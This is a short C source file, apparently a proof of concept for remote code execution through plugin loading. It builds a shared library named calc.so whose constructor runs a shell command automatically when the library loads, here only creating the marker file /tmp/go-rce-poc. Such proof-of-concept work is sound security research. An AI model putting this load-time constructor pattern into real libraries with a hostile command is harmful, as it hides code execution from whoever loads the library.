#include <stdio.h>
#include <stdlib.h>

/*
build: gcc -shared -o calc.so -fPIC calc.c
*/

static void plugon() __attribute__((constructor));
void plugon() {
    system("touch /tmp/go-rce-poc");
}
